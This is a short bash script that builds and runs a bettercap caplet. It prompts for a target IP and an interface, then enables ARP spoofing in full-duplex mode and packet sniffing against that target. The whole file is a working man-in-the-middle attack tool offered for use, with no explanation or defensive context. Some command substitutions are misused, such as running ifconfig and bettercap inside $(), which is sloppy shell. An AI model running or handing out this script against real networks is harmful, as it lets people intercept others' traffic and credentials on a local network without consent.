#!/usr/bin/env bash

echo "Target IP: "
read ip
$(ifconfig)
echo "Network Interface: "
read interface
echo net.probe on >>spoof-temp.cap
echo set arp.spoof.fullduplex true >>spoof-temp.cap
echo set arp.spoof.targets $ip >>spoof-temp.cap
echo arp.spoof on >>spoof-temp.cap
echo arp.sniff on >>spoof-temp.cap
$(bettercap -iface $interface -caplet spoof-temp.cap)

     # For .cap file
     # $(bettercap -iface eth0 -caplet spoof.cap)
